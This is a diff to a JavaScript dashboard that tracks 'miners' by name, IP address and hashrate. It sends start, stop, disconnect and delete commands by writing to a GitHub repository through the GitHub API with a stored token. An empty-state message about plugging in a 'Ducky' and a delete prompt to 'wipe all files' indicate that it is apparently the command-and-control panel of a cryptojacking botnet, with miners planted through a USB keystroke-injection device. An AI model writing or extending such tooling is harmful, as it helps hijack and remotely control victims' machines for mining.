@@ -16,6 +16,7 @@ h1 span{color:#3fb950}
 .miner{display:flex;align-items:center;gap:15px;padding:15px;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:10px}
 .dot{width:12px;height:12px;border-radius:50%;background:#484f58}
 .dot.on{background:#3fb950;box-shadow:0 0 10px #3fb950}
+.dot.idle{background:#f0883e}
 .info{flex:1}
 .name{font-weight:500}
 .sub{font-size:12px;color:#8b949e}
@@ -65,6 +66,7 @@ body:JSON.stringify({message:"cmd",content:btoa(JSON.stringify(cmds)),sha:sha_c}
 });
 if(cmd=="delete"){
 delete miners[id];
+delete cmds[id];
 await fetch(`https://api.github.com/repos/${REPO}/contents/miners.json`,{
 method:"PUT",
 headers:{Authorization:`token ${TOKEN}`,"Content-Type":"application/json"},
@@ -76,23 +78,25 @@ load();
 
 function render(){
 const list=Object.entries(miners);
-if(!list.length){document.getElementById('list').innerHTML='<div class="empty">No miners yet</div>';return}
+if(!list.length){document.getElementById('list').innerHTML='<div class="empty">No miners yet - plug in your Ducky!</div>';document.getElementById('s-active').textContent='0';document.getElementById('s-hr').textContent='0 H/s';return}
 let active=0,hr=0;
 document.getElementById('list').innerHTML=list.map(([id,d])=>{
-const on=(Date.now()-d.lastSeen)<120000&&d.mining;
-const stopped=cmds[id]=="stop";
-const disc=cmds[id]=="disconnect";
-if(on&&!stopped&&!disc){active++;hr+=d.hashrate||0}
-let status=disc?"Disconnected":(stopped?"Stopped":(on?"Mining":"Offline"));
-let dotClass=disc?"":stopped?"":(on?"on":"");
+const online=(Date.now()-d.lastSeen)<120000;
+const cmd=cmds[id]||"";
+const stopped=cmd=="stop";
+const disc=cmd=="disconnect";
+const mining=online&&d.mining&&!stopped&&!disc;
+if(mining){active++;hr+=d.hashrate||0}
+let status=!online?"Offline":disc?"Disconnected":stopped?"Idle (stopped)":d.mining?"Mining":"Idle";
+let dotClass=!online?"":disc?"":stopped?"idle":d.mining?"on":"idle";
 return`<div class="miner">
 <div class="dot ${dotClass}"></div>
 <div class="info"><div class="name">${d.name}</div><div class="sub">${d.ip} • ${status}</div></div>
-<div class="hr">${on&&!stopped&&!disc?(d.hashrate||0)+' H/s':'—'}</div>
+<div class="hr">${mining?(d.hashrate||0)+' H/s':'—'}</div>
 <div class="btns">
-${stopped||disc?`<button class="btn start" onclick="sendCmd('${id}','start')">Start</button>`:`<button class="btn stop" onclick="sendCmd('${id}','stop')">Stop</button>`}
+${stopped?`<button class="btn start" onclick="sendCmd('${id}','start')">Start</button>`:`<button class="btn stop" onclick="sendCmd('${id}','stop')">Stop</button>`}
 ${disc?`<button class="btn start" onclick="sendCmd('${id}','connect')">Connect</button>`:`<button class="btn" onclick="sendCmd('${id}','disconnect')">Disconnect</button>`}
-<button class="btn del" onclick="sendCmd('${id}','delete')">✕</button>
+<button class="btn del" onclick="if(confirm('Delete miner and wipe all files?'))sendCmd('${id}','delete')">✕</button>
 </div>
 </div>`;
 }).join('');
